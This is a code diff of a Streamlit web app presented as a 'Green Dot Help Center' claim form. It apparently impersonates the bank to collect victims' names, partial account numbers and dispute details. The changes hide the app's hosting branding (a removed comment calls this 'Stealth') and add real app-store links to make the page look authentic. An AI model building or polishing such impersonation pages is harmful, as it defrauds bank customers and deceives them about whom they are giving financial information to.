@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# 1. JS: LIMPIEZA DE INTERFAZ (Anti-anchor y Stealth)
+# 1. JS: LIMPIEZA DE INTERFAZ
 st.markdown("""<script>
     const cleanDOM = () => {
         const selectors = [
@@ -37,14 +37,21 @@ st.markdown("""<script>
     setInterval(cleanDOM, 500);
 </script>""", unsafe_allow_html=True)
 
-# 2. CSS: DISEÑO COMPACTO
+# 2. CSS: CONTROL DE INTERACCIÓN
 st.markdown("""<style>
 header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { display: none !important; }
 
+/* Desactivar links en logo y títulos */
 [data-testid="stImage"], [data-testid="stImage" ] img, h1, h2, h3, .stMarkdown h1, .stMarkdown h2 {
     pointer-events: none !important;
     cursor: default !important;
     user-select: none !important;
+}
+
+/* EXCEPCIÓN: Activar interacción solo para la caja de descarga de apps */
+.promo-box, .promo-box a, .promo-box img {
+    pointer-events: auto !important;
+    cursor: pointer !important;
 }
 
 .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
@@ -83,7 +90,7 @@ header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor { dis
 }
 </style>""", unsafe_allow_html=True)
 
-# Logo centralizado
+# Logo centralizado (Inactivo)
 col1, col2, col3 = st.columns([1,2,1])
 with col2:
     if os.path.exists('logo.svg'):
@@ -92,7 +99,7 @@ with col2:
 st.title("Help Center")
 st.write("Please fill out the form below to submit your claim.")
 
-with st.form("compact_form_v21_2", clear_on_submit=True):
+with st.form("compact_form_v21_3", clear_on_submit=True):
     nombre = st.text_input("Full Name")
     cuenta = st.text_input("Last 4 digits of Account")
     monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -104,11 +111,16 @@ with st.form("compact_form_v21_2", clear_on_submit=True):
 if submitted:
     if nombre and rec and car: st.success("✅ Claim received.")
 
+# Sección App (ACTIVA)
 st.markdown("""<div class='promo-box'>
     <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
     <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
+        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
+            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
+        </a>
+        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
+            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
+        </a>
     </div>
     <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
 </div>""", unsafe_allow_html=True)
